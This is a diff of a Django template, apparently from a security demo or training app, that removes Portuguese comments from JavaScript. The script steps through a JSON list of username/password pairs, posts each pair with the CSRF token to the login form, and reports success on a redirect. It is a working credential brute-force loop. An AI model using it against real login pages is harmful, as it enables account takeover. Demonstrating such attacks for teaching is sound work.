@@ -104,7 +104,6 @@
             statusDiv.innerHTML = "Carregando lista de senhas...";
 
             try {
-              // 1. Carregar o payload JSON
               const response = await fetch(
                 '{% static "data/bruteforce_payload.json" %}'
               );
@@ -115,11 +114,9 @@
 
               statusDiv.innerHTML = `Iniciando ataque contra {{ level }} tentativas.`;
 
-              // 2. Iterar sobre o payload
               for (let i = 0; i < payload.length; i++) {
                 const attempt = payload[i];
 
-                // Atualiza os campos do formulário para visualização
                 usernameInput.value = attempt.username;
                 passwordInput.value = attempt.password;
 
@@ -129,34 +126,26 @@
                   attempt.password
                 } - Tentando...`;
 
-                // Simular a requisição de login
                 const loginResponse = await fetch(form.action, {
                   method: "POST",
                   headers: {
                     "Content-Type": "application/x-www-form-urlencoded",
                     "X-CSRFToken": csrfToken,
                   },
-                  // Montar os dados do formulário
                   body: new URLSearchParams({
                     username: attempt.username,
                     password: attempt.password,
                     csrfmiddlewaretoken: csrfToken,
                   }),
                 });
-
-                // 3. Verificar o resultado
-                // Em Django, um login bem-sucedido geralmente redireciona (status 302).
-                // Um ataque bem-sucedido é detectado se o redirecionamento for para a dashboard.
                 if (loginResponse.redirected) {
                   statusDiv.innerHTML = `<span style="color: green;">SUCESSO!</span> Senha encontrada na tentativa ${
                     i + 1
                   }. Redirecionando...`;
-                  // Redirecionar manualmente para a página de sucesso
                   window.location.href = loginResponse.url;
                   return;
                 }
 
-                // Pequena pausa para simular o tempo de rede/processamento
                 await new Promise((resolve) => setTimeout(resolve, 300));
               }
 
